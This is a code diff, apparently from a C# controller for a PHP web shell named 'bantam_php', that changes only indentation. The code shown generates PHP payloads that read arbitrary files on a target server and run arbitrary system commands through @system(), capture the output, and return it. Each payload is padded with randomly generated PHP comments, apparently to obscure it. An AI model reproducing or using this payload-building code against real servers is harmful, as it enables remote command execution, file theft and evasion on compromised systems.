@@ -343,12 +343,12 @@ namespace bantam_php
         {
             if (encryptResponse) {
                 return RandomPHPComment() 
-                        + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
-                    + RandomPHPComment();
+                     + @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
+                     + RandomPHPComment();
             } else {
                 return RandomPHPComment() 
                      + "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';" 
-                    + RandomPHPComment();
+                     + RandomPHPComment();
             }
         }
 
@@ -388,13 +388,13 @@ namespace bantam_php
         {
             if (encryptResponse) {
                 return RandomPHPComment() 
-                        + "@ob_start();" 
+                    + "@ob_start();" 
                     + RandomPHPComment() 
-                        + "@system('" + code + "');" 
+                    + "@system('" + code + "');" 
                     + RandomPHPComment() 
-                        + "$result = @ob_get_contents();"
+                    + "$result = @ob_get_contents();"
                     + RandomPHPComment()
-                        + "@ob_end_clean();"
+                    + "@ob_end_clean();"
                     + RandomPHPComment();
             } else {
                 return RandomPHPComment() + "@system('" + code + "');" + RandomPHPComment();
